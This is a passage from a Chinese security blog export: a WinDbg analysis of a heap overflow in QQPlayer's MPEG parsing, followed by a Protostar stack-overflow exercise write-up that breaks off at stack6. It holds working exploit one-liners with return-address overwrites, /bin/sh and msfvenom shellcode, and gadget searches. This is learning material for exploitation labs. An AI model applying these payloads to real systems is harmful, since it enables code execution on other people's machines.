12345678910111213141516171819202122232425262728293031320:003&gt; !gflagCurrent NtGlobalFlag contents: 0x00000010 htc - Enable heap tail checking0:003&gt; gModLoad: 76d30000 76d48000 C:\\WINDOWS\\system32\\iphlpapi.dllModLoad: 719c0000 719fe000 C:\\WINDOWS\\System32\\mswsock.dllModLoad: 76ef0000 76f17000 C:\\WINDOWS\\system32\\DNSAPI.dllModLoad: 76f80000 76f88000 C:\\WINDOWS\\System32\\winrnr.dllModLoad: 76f30000 76f5c000 C:\\WINDOWS\\system32\\WLDAP32.dllModLoad: 76f90000 76f96000 C:\\WINDOWS\\system32\\rasadhlp.dllModLoad: 5fdd0000 5fe25000 C:\\WINDOWS\\system32\\netapi32.dllModLoad: 75c60000 75d00000 C:\\WINDOWS\\system32\\urlmon.dllModLoad: 76d70000 76d92000 C:\\WINDOWS\\system32\\Apphelp.dllModLoad: 76d30000 76d48000 C:\\WINDOWS\\system32\\iphlpapi.dllModLoad: 60fd0000 61025000 C:\\WINDOWS\\system32\\hnetcfg.dllModLoad: 71a00000 71a08000 C:\\WINDOWS\\System32\\wshtcpip.dllModLoad: 03600000 0367b000 C:\\Program Files\\Tencent\\QQPlayer\\MpegSplitter.axModLoad: 03680000 03707000 C:\\Program Files\\Tencent\\QQPlayer\\splitter.axModLoad: 032b0000 032c6000 C:\\Program Files\\Tencent\\QQPlayer\\mkzlib.dllModLoad: 032d0000 032db000 C:\\Program Files\\Tencent\\QQPlayer\\mkunicode.dllModLoad: 03710000 0373a000 C:\\Program Files\\Tencent\\QQPlayer\\mkx.dllModLoad: 03f40000 03f6a000 C:\\Program Files\\Tencent\\QQPlayer\\ts.dllModLoad: 68000000 68036000 C:\\WINDOWS\\system32\\rsaenh.dll(2f0.7fc): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=41414141 ebx=033a410c ecx=003f8670 edx=000000f7 esi=003f8670 edi=003f867ceip=7cf9409c esp=024ff690 ebp=024ff6a0 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202quartz!CBasePin::ReceiveConnection+0xb0:7cf9409c ff5024 call dword ptr [eax+24h] ds:0023:41414165=????????*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Program Files\\Tencent\\QQPlayer\\splitter.ax - what？？？怎么跟作者的不一样，查看堆栈也没啥，那我尝试关掉htc看看结果如何，gflag为0，发现异常位置也是不一样 1234567891011(4c4.684): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=02ad89d4 ebx=02ad9f90 ecx=42414141 edx=00000000 esi=02ad9f78 edi=02ad89c8eip=7cf8aa00 esp=023ff824 ebp=023ff838 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246quartz!CEnumPins::Next+0x9e:7cf8aa00 ff5104 call dword ptr [ecx+4] ds:0023:42414145=????????*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Program Files\\Tencent\\QQPlayer\\QQPlayer.exe - 0:001&gt; !gflagCurrent NtGlobalFlag contents: 0x00000000 还有一个，那我们只开hpa情况又会怎么样呢，怎么跟作者什么都没开一样 1234567891011121314(590.dc4): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=41414141 ebx=012e0000 ecx=41414141 edx=02b589c8 esi=02b589c0 edi=00000003eip=7c910efe esp=0235f07c ebp=0235f29c iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246ntdll!RtlAllocateHeap+0x653:7c910efe 8b39 mov edi,dword ptr [ecx] ds:0023:41414141=????????*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Program Files\\Tencent\\QQPlayer\\VSFilter.ax - *** WARNING: Unable to verify checksum for QQPlayer.exe*** ERROR: Symbol file could not be found. Defaulted to export symbols for QQPlayer.exe - 0:002&gt; !gflag Current NtGlobalFlag contents: 0x02000000 hpa - Place heap allocations at ends of pages 那时的我有那么几秒钟是崩溃的，很多时候就是那么几秒钟决定了你是继续下去，还是放弃 那我用最原始的办法，看看汇编下面的eax怎么来的，针对开了 17cf9409c ff5024 call dword ptr [eax+24h] ds:0023:41414165=???????? 在前面的eax赋值地方下个断点 123456789101112Breakpoint 0 hiteax=00000009 ebx=032340c4 ecx=03233cb8 edx=000000f7 esi=02b69c20 edi=02b69c2ceip=7cf94098 esp=024ff690 ebp=024ff6a0 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202quartz!CBasePin::ReceiveConnection+0xac:7cf94098 8b06 mov eax,dword ptr [esi] ds:0023:02b69c20=41414141*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Program Files\\Tencent\\QQPlayer\\splitter.ax - 0:002&gt; !heap -p -a 02b69c20 address 02b69c20 found in _HEAP @ 3f0000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 02b69c18 4141 0000 [41] 02b69c20 20a07 - (busy) 可以看到这里esi指向的堆的大小等字段被覆盖成4141了，那是什么时候覆盖的呢 我们在前面esi赋值的地方下断点 1.text:7CF94061 lea esi, [edi-0Ch] 我们发现此时还没被覆盖 12345678910111213141516171819202122Breakpoint 0 hiteax=003f82b0 ebx=036b419c ecx=7ffdd000 edx=003f830c esi=00000000 edi=003f861ceip=7cf94061 esp=024ff694 ebp=024ff6a0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246quartz!CBasePin::ReceiveConnection+0x55:7cf94061 8d77f4 lea esi,[edi-0Ch]*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Program Files\\Tencent\\QQPlayer\\splitter.ax - 0:002&gt; peax=003f82b0 ebx=036b419c ecx=7ffdd000 edx=003f830c esi=003f8610 edi=003f861ceip=7cf94064 esp=024ff694 ebp=024ff6a0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246quartz!CBasePin::ReceiveConnection+0x58:7cf94064 8b06 mov eax,dword ptr [esi] ds:0023:003f8610=&#123;quartz!CMpegVideoInputPin::`vftable&apos; (7cf78b04)&#125;0:002&gt; dd esi003f8610 7cf78b04 003f8610 00000000 7cf73ed0003f8620 7cf730a0 003f8700 00000000 00000000003f8630 003f830c 00000000 003f82b0 00000000003f8640 00000001 00000000 00000000 00000000003f8650 00000000 00000000 00000000 00000000003f8660 00000000 00000001 00000000 00000001003f8670 00000000 00000000 00000000 00000000003f8680 00000000 00000000 00000000 00000000 我们此时可以将003f8610 这个地址放到memory窗口，单步查看什么时候被改变了，你会发现是这里是003f8610 那一片变成了4141…..，跟着f11重新跟入使用同样的方法就行了 17cf9407e ff5020 call dword ptr [eax+20h] ds:0023:7cf78b24=&#123;quartz!CTransformInputPin::CheckMediaType (7cf9de49)&#125; 后来发现这办法太那个了，直接下写入断点就行了，就可以直达了，上面就换乘了 123456780:002&gt; ba w1 003f8610 0:002&gt; gBreakpoint 1 hiteax=000000c3 ebx=003f82b0 ecx=00000004 edx=000000f7 esi=0017b8f8 edi=003f8614eip=7d0706d0 esp=024ff650 ebp=024ff658 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202quartz!ParseSequenceHeader+0x114:7d0706d0 f3a5 rep movs dword ptr es:[edi],dword ptr [esi] 我们看看此时的源地址和目的地址，目的堆块的size已经被覆盖成4141了 1234567891011120:002&gt; !heap -p -a esi address 0017b8f8 found in _HEAP @ 150000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 0017b7e0 0027 0000 [05] 0017b7e8 00123 - (busy) 0:002&gt; !heap -p -a edi address 003f8614 found in _HEAP @ 3f0000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 003f8608 4141 0000 [41] 003f8610 20a07 - (busy) 我们看看edi的前一个堆的位置（随便找个小于003f8608 ，被4141覆盖的就行了），可以看到本来是003f82a8堆块的数据，最后确实是覆盖到了下一个堆003f8608了，htc也没有检查出来 123456789101112131415161718192021222324252627280:002&gt; !heap -p -a 003f8570 address 003f8570 found in _HEAP @ 3f0000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 003f82a8 006c 0000 [05] 003f82b0 00350 - (busy) quartz!CMpegVideoCodec::`vftable&apos;0:002&gt; dd 003f8570 l50003f8570 41414141 41414141 41414141 41414141003f8580 41414141 41414141 41414141 41414141003f8590 41414141 41414141 41414141 41414141003f85a0 41414141 41414141 41414141 41414141003f85b0 41414141 41414141 41414141 41414141003f85c0 41414141 41414141 41414141 41414141003f85d0 41414141 41414141 41414141 41414141003f85e0 41414141 41414141 41414141 41414141003f85f0 41414141 41414141 41414141 41414141003f8600 41414141 41414141 41414141 41414141003f8610 41414141 003f8610 00000000 7cf73ed0003f8620 7cf730a0 003f8700 00000000 00000000003f8630 003f830c 00000000 003f82b0 00000000003f8640 00000001 00000000 00000000 00000000003f8650 00000000 00000000 00000000 00000000003f8660 00000000 00000001 00000000 00000001003f8670 00000000 00000000 00000000 00000000003f8680 00000000 00000000 00000000 00000000003f8690 00000000 00000000 ffffffff 7fffffff003f86a0 00000000 3ff00000 7cf74678 00000000 最后说说之后回到家用自己的电脑又可以了，无语~（但htc还是不行），可能一个细微的差别都会导致调试结果不尽相同，软件版本，系统，还有虚拟机毕竟是虚拟出来的。 1234567891011(7c0.1a4): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=000000c3 ebx=027c8cb0 ecx=00000009 edx=000000f7 esi=14f02fd4 edi=027c9000eip=7d0706d0 esp=0d90f650 ebp=0d90f658 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202quartz!ParseSequenceHeader+0x114:7d0706d0 f3a5 rep movs dword ptr es:[edi],dword ptr [esi]0:001&gt; !gflagCurrent NtGlobalFlag contents: 0x02000000 hpa - Place heap allocations at ends of pages","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"}]},{"title":"Exploit Exercises Protostar Stack Part 0-7","slug":"Exploit Exercises Protostar Stack Part 0-7","date":"2017-08-03T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2017/08/03/Exploit Exercises Protostar Stack Part 0-7/","link":"","permalink":"https://www.giantbranch.cn/2017/08/03/Exploit Exercises Protostar Stack Part 0-7/","excerpt":"","text":"Stack0首先看下源码 123456789101112131415161718#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv)&#123; volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) &#123; printf(&quot;you have changed the &apos;modified&apos; variable\\n&quot;); &#125; else &#123; printf(&quot;Try again?\\n&quot;); &#125;&#125; 看来我们是要通过缓冲区溢出讲局部变量modified的值改为1或者我们将程序的返回值直接执行成功的printf就行了 首先看看汇编代码 123456789101112131415161718192021(gdb) disassemble mainDump of assembler code for function main:0x080483f4 &lt;main+0&gt;: push %ebp0x080483f5 &lt;main+1&gt;: mov %esp,%ebp0x080483f7 &lt;main+3&gt;: and $0xfffffff0,%esp0x080483fa &lt;main+6&gt;: sub $0x60,%esp0x080483fd &lt;main+9&gt;: movl $0x0,0x5c(%esp) 0x08048405 &lt;main+17&gt;: lea 0x1c(%esp),%eax0x08048409 &lt;main+21&gt;: mov %eax,(%esp)0x0804840c &lt;main+24&gt;: call 0x804830c &lt;gets@plt&gt;0x08048411 &lt;main+29&gt;: mov 0x5c(%esp),%eax0x08048415 &lt;main+33&gt;: test %eax,%eax0x08048417 &lt;main+35&gt;: je 0x8048427 &lt;main+51&gt;0x08048419 &lt;main+37&gt;: movl $0x8048500,(%esp)0x08048420 &lt;main+44&gt;: call 0x804832c &lt;puts@plt&gt;0x08048425 &lt;main+49&gt;: jmp 0x8048433 &lt;main+63&gt;0x08048427 &lt;main+51&gt;: movl $0x8048529,(%esp)0x0804842e &lt;main+58&gt;: call 0x804832c &lt;puts@plt&gt;0x08048433 &lt;main+63&gt;: leave 0x08048434 &lt;main+64&gt;: ret End of assembler dump. 看到这个0x080483fd &lt;main+9&gt;: movl $0x0,0x5c(%esp) ，就是 modified = 0; 下面这个就是buffer的地址 120x08048405 &lt;main+17&gt;: lea 0x1c(%esp),%eax0x08048409 &lt;main+21&gt;: mov %eax,(%esp) 为了看看开了什么保护，还是装个peda，懒得去单独搞个checksec了，结果发现用不了这个虚拟机的gdb不支持python的感觉，还是搞checksec吧 123$ ./checksec -f /opt/protostar/bin/stack0RELRO STACK CANARY NX PIE RPATH RUNPATH FORTIFY Fortified Fortifiable FILENo RELRO No canary found NX disabled No PIE No RPATH No RUNPATH No 0 2 /opt/protostar/bin/stack0 0x5c跟0x1c相差了0x40个字节，我们实时0x44个A是什么情况可以看到刚好覆盖到了，假如我们覆盖成1或者其他非0值就行 12(gdb) x /4w $esp+0x5c0xbffffcac: 0x41414141 0x08048400 0x00000000 0xbffffd38 覆盖成1或者其他非0值1234$ python -c &apos;print &quot;A&quot;*0x40+&quot;\\x01\\x00\\x00\\x00&quot;&apos; | ./stack0you have changed the &apos;modified&apos; variable$ python -c &apos;print &quot;A&quot;*0x40+&quot;\\x01&quot;&apos; | ./stack0you have changed the &apos;modified&apos; variable ##覆盖返回地址 发现buffer距离返回地址是0x54,后面改为要覆盖的地址即可 12345678$ python -c &apos;print &quot;A&quot;*0x50+&quot;\\x19\\x84\\x04\\x08&quot;&apos; | ./stack0you have changed the &apos;modified&apos; variableyou have changed the &apos;modified&apos; variableSegmentation fault $ python -c &apos;print &quot;\\x00&quot;*0x50+&quot;\\x19\\x84\\x04\\x08&quot;&apos; | ./stack0Try again?you have changed the &apos;modified&apos; variableSegmentation fault 有个问题就是段错误了 stack1还是先看代码 1234567891011121314151617181920212223#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv)&#123; volatile int modified; char buffer[64]; if(argc == 1) &#123; errx(1, &quot;please specify an argument\\n&quot;); &#125; modified = 0; strcpy(buffer, argv[1]); if(modified == 0x61626364) &#123; printf(&quot;you have correctly got the variable to the right value\\n&quot;); &#125; else &#123; printf(&quot;Try again, you got 0x%08x\\n&quot;, modified); &#125;&#125; 这个基本跟stack0差不多，不过这里要求modified 必须为0x61626364还有就是这里通过命令行传参 结果： 12$ ./stack1 $(python -c &apos;print &quot;A&quot;*0x40+&quot;dcba&quot;&apos;) you have correctly got the variable to the right value stack212345678910111213141516171819202122232425262728#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv)&#123; volatile int modified; char buffer[64]; char *variable; variable = getenv(&quot;GREENIE&quot;); if(variable == NULL) &#123; errx(1, &quot;please set the GREENIE environment variable\\n&quot;); &#125; modified = 0; strcpy(buffer, variable); if(modified == 0x0d0a0d0a) &#123; printf(&quot;you have correctly modified the variable\\n&quot;); &#125; else &#123; printf(&quot;Try again, you got 0x%08x\\n&quot;, modified); &#125;&#125; 这里考察的是设置环境变量 1234$ GREENIE=`python -c &apos;print &quot;A&quot;*0x40+&quot;\\x0a\\x0d\\x0a\\x0d&quot;&apos;`$ export GREENIE$ ./stack2you have correctly modified the variable stack 3代码 123456789101112131415161718192021222324#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void win()&#123; printf(&quot;code flow successfully changed\\n&quot;);&#125;int main(int argc, char **argv)&#123; volatile int (*fp)(); char buffer[64]; fp = 0; gets(buffer); if(fp) &#123; printf(&quot;calling function pointer, jumping to 0x%08x\\n&quot;, fp); fp(); &#125;&#125; 获得win函数地址 12(gdb) print win$1 = &#123;void (void)&#125; 0x8048424 &lt;win&gt; 所以最终就简单了，但是我们这里好像直接覆盖返回地址的话比如覆盖一个fp能执行且不影响程序的地址，原因应该是调用了fp();为了简单所以我们覆盖fp的值就好了 123$ python -c &apos;print &quot;A&quot;*0x40+&quot;\\x24\\x84\\x04\\x08&quot;&apos; | ./stack3 calling function pointer, jumping to 0x08048424code flow successfully changed stack412345678910111213141516#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void win()&#123; printf(&quot;code flow successfully changed\\n&quot;);&#125;int main(int argc, char **argv)&#123; char buffer[64]; gets(buffer);&#125; 这个就直接覆盖返回地址了 12(gdb) print win$1 = &#123;void (void)&#125; 0x80483f4 &lt;win&gt; 调试发现偏移是0x4c 123$ python -c &apos;print &quot;A&quot;*0x4C+&quot;\\xf4\\x83\\x04\\x08&quot;&apos; | ./stack4code flow successfully changedSegmentation fault stack51234567891011#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv)&#123; char buffer[64]; gets(buffer);&#125; 这里叫你开始执行shellcode了 12345678910111213141516171819202122(gdb) disassemble mainDump of assembler code for function main:0x080483c4 &lt;main+0&gt;: push %ebp0x080483c5 &lt;main+1&gt;: mov %esp,%ebp0x080483c7 &lt;main+3&gt;: and $0xfffffff0,%esp0x080483ca &lt;main+6&gt;: sub $0x50,%esp0x080483cd &lt;main+9&gt;: lea 0x10(%esp),%eax0x080483d1 &lt;main+13&gt;: mov %eax,(%esp)0x080483d4 &lt;main+16&gt;: call 0x80482e8 &lt;gets@plt&gt;0x080483d9 &lt;main+21&gt;: leave 0x080483da &lt;main+22&gt;: ret End of assembler dump.(gdb) b *0x080483d4Breakpoint 1 at 0x80483d4: file stack5/stack5.c, line 10.(gdb) rStarting program: /opt/protostar/bin/stack5 Breakpoint 1, 0x080483d4 in main (argc=1, argv=0xbffffd64) at stack5/stack5.c:1010 stack5/stack5.c: No such file or directory. in stack5/stack5.c(gdb) x $eax0xbffffc70: 0xb7fd7ff4 eax的值就是局部变量的其实地址，我们将返回地址覆盖为这个，shellcode放最前面就行了 有个坑就是这个地址跟实际的不一样，我们调试的gdb地址是调试状态的地址。所以要用core文件。 用这个定位ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 12345678910111213141516171819202122232425262728293031323334root@protostar:/tmp# gdb /opt/protostar/bin/stack5 core.11.stack5.3147 GNU gdb (GDB) 7.0.1-debianCopyright (C) 2009 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot;and &quot;show warranty&quot; for details.This GDB was configured as &quot;i486-linux-gnu&quot;.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.../root/.gdbinit:1: Error in sourced command file:/root/peda/peda.py:8: Error in sourced command file:Undefined command: &quot;from&quot;. Try &quot;help&quot;.Reading symbols from /opt/protostar/bin/stack5...done.warning: Can&apos;t read pathname for load map: Input/output error.Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.(no debugging symbols found)...done.Loaded symbols for /lib/libc.so.6Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.(no debugging symbols found)...done.Loaded symbols for /lib/ld-linux.so.2Core was generated by `./stack5&apos;.Program terminated with signal 11, Segmentation fault.#0 0x41414141 in ?? ()(gdb) x /30x $esp-0x500xbffffc50: 0x44434241 0x41414141 0x41414141 0x414141410xbffffc60: 0x41414141 0x41414141 0x41414141 0x414141410xbffffc70: 0x41414141 0x41414141 0x41414141 0x414141410xbffffc80: 0x41414141 0x41414141 0x41414141 0x414141410xbffffc90: 0x41414141 0x41414141 0x41414141 0x414141410xbffffca0: 0x41414141 0xbffffd00 0xbffffd4c 0xb7fe18480xbffffcb0: 0xbffffd00 0xffffffff 0xb7ffeff4 0x080482320xbffffcc0: 0x00000001 0xbffffd00 感觉这系统有点问题，没有任何返回，如果exit，就退出了，而不是返回上一层shell 12345root@protostar:/opt/protostar/bin# python -c &apos;print &quot;\\x90&quot; * 0x4c + &quot;\\x90\\xfc\\xff\\xbf&quot; + &quot;\\x33\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x8b\\xdc\\xb0\\x0b\\xcd\\x80&quot;&apos; | ./stack5root@protostar:/opt/protostar/bin# python -c &apos;print &quot;\\x90&quot; * 0x4c + &quot;\\x90\\xfc\\xff\\xbf&quot; + &quot;\\x33\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x8b\\xdc\\xb0\\x0b\\xcd\\x80&quot;&apos; | ./stack5root@protostar:/opt/protostar/bin# python -c &apos;print &quot;\\x90&quot; * 0x4c + &quot;\\x90\\xfc\\xff\\xbf&quot; + &quot;\\x33\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x8b\\xdc\\xb0\\x0b\\xcd\\x80&quot;&apos; | ./stack5 后来直接用exec(ls)的shellcode 12345678910giantbranch:~# msfvenom -p linux/x86/exec CMD=&quot;ls&quot; -f python No platform was selected, choosing Msf::Module::Platform::Linux from the payloadNo Arch selected, selecting Arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 38 bytesFinal size of python file: 192 bytesbuf = &quot;&quot;buf += &quot;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f&quot;buf += &quot;\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x03&quot;buf += &quot;\\x00\\x00\\x00\\x6c\\x73\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80&quot; 那么就可以执行ls的了，真是日了狗，应该是我第一次的shellcode错了（当时是学习一步一步学rop时候的shellcode，怎么会错了） 123456root@protostar:/opt/protostar/bin# python -c &apos;print &quot;\\x90&quot; * 0x4c + &quot;\\x10\\xfd\\xff\\xbf&quot; + &quot;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x03\\x00\\x00\\x00\\x6c\\x73\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80&quot;&apos; | ./stack5final0 final2 format1 format3 heap0 heap2 net0 net2 net4 stack1 stack3 stack5 stack7final1 format0 format2 format4 heap1 heap3 net1 net3 stack0 stack2 stack4 stack6root@protostar:/opt/protostar/bin# python -c &apos;print &quot;\\x90&quot; * 0x4c + &quot;\\x10\\xfd\\xff\\xbf&quot; + &quot;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x03\\x00\\x00\\x00\\x6c\\x73\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80&quot;&apos; | ./stack5final0 final2 format1 format3 heap0 heap2 net0 net2 net4 stack1 stack3 stack5 stack7final1 format0 format2 format4 heap1 heap3 net1 net3 stack0 stack2 stack4 stack6 stack612345678910111213141516171819202122232425262728#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void getpath()&#123; char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xbf000000) == 0xbf000000) &#123; printf(&quot;bzzzt (%p)\\n&quot;, ret); _exit(1); &#125; printf(&quot;got path %s\\n&quot;, buffer);&#125;int main(int argc, char **argv)&#123; getpath();&#125; 这里if((ret &amp; 0xbf000000) == 0xbf000000)，如果返回地址是以bf开头，那么就会退出，所以我们要讲返回地址改成其他地址，比如程序中或者libc库中的地址 先定位返回值，懒得gdb调试定位了，直接peda（如果当前虚拟机用不了peda，可以用别的虚拟机啊） 12gdb-peda$ pattern_create 150&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos; 看看那里崩溃了 12345678(gdb) rStarting program: /opt/protostar/bin/stack6 input path please: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAgot path AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAProgram received signal SIGSEGV, Segmentation fault.0x41414a41 in ?? ()(gdb) 查偏移为80 12gdb-peda$ pattern_offset 0x41414a41 1094797889 found at offset: 80 覆盖返回地址为ret指令地址将返回地址覆盖为ret指令，下一个dword就可以0xbf开头了 随便在下面找ret的地址就好 1234567891011121314151617181920212223242526272829303132333435root@protostar:/opt/protostar/bin# objdump -d ./stack6./stack6: file format elf32-i386Disassembly of section .init:08048330 &lt;_init&gt;: 8048330: 55 push %ebp 8048331: 89 e5 mov %esp,%ebp 8048333: 53 push %ebx 8048334: 83 ec 04 sub $0x4,%esp 8048337: e8 00 00 00 00 call 804833c &lt;_init+0xc&gt; 804833c: 5b pop %ebx 804833d: 81 c3 b0 13 00 00 add $0x13b0,%ebx 8048343: 8b 93 fc ff ff ff mov -0x4(%ebx),%edx 8048349: 85 d2 test %edx,%edx 804834b: 74 05 je 8048352 &lt;_init+0x22&gt; 804834d: e8 1e 00 00 00 call 8048370 &lt;__gmon_start__@plt&gt; 8048352: e8 09 01 00 00 call 8048460 &lt;frame_dummy&gt; 8048357: e8 24 02 00 00 call 8048580 &lt;__do_global_ctors_aux&gt; 804835c: 58 pop %eax 804835d: 5b pop %ebx 804835e: c9 leave 804835f: c3 ret Disassembly of section .plt:08048360 &lt;__gmon_start__@plt-0x10&gt;: 8048360: ff 35 f0 96 04 08 pushl 0x80496f0 8048366: ff 25 f4 96 04 08 jmp *0x80496f4 804836c: 00 00 add %al,(%eax) ... ... ... 我选这个吧:804835f 12345root@protostar:/opt/protostar/bin# python -c &apos;print &quot;A&quot; * 80 + &quot;\\x5f\\x83\\x04\\x08&quot; + &quot;\\xe4\\xfc\\xff\\xbf&quot; + &quot;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x03\\x00\\x00\\x00\\x6c\\x73\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80&quot;&apos; | ./stack6input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA彿¿j XRfh-c榯sh1.txt final1 format0 format2 format4 heap1 heap3 net1 net3 stack0 stack2 stack4 stack6final0 final2 format1 format3 heap0 heap2 net0 net2 net4 stack1 stack3 stack5 stack7 覆盖返回地址为jmp esp这个应该是比较最为通用方便的了 由于在当前程序找不到，我们去libc找吧看看使用的库在哪 1234root@protostar:/opt/protostar/bin# ldd ./stack6 linux-gate.so.1 =&gt; (0xb7fe4000) libc.so.6 =&gt; /lib/libc.so.6 (0xb7e99000) /lib/ld-linux.so.2 (0xb7fe5000) 用rp查找一下 12345678910111213141516171819root@protostar:/opt/protostar/bin# ./rp-lin-x86 -f /lib/libc.so.6 --rop=2 | grep &quot;call esp&quot;0x00117fc0: aam 0x74 ; out dx, al ; call esp ; (1 found)............0x001288a8: add dh, dh ; call esp ; (1 found)0x001288a9: add dh, dh ; call esp ; (1 found)0x00129f18: bound ecx, dword [ebp] ; sti ; call esp ; (1 found)0x00002e63: call esp ; (1 found)0x00083a4b: call esp ; (1 found)0x00110af8: call esp ; (1 found)0x00117fc3: call esp ; (1 found)0x0011a12a: call esp ; (1 found)0x0011a12b: call esp ; (1 found)0x0011b17e: call esp ; (1 found)0x0011b17f: call esp ; (1 found)0x0011b19a: call esp ; (1 found)0x0011b19b: call esp ; (1 found)............ 选这个吧0x00110af8 12&gt;&gt;&gt; hex(0xb7e99000 + 0x00110af8)&apos;0xb7fa9af8L&apos; 但发现这是错的 12345(gdb) x /4i 0xb7fa9af8L0xb7fa9af8 &lt;translit_to_idx+4504&gt;: adc $0x18000010,%eax0xb7fa9afd &lt;translit_to_idx+4509&gt;: adc %al,(%eax)0xb7fa9aff &lt;translit_to_idx+4511&gt;: add %bl,(%ebx)0xb7fa9b01 &lt;translit_to_idx+4513&gt;: adc %al,(%eax) 后来直接看maps 123456789101112root@protostar:/home/user# cat /proc/5087/maps 08048000-0804e000 r-xp 00000000 00:10 260 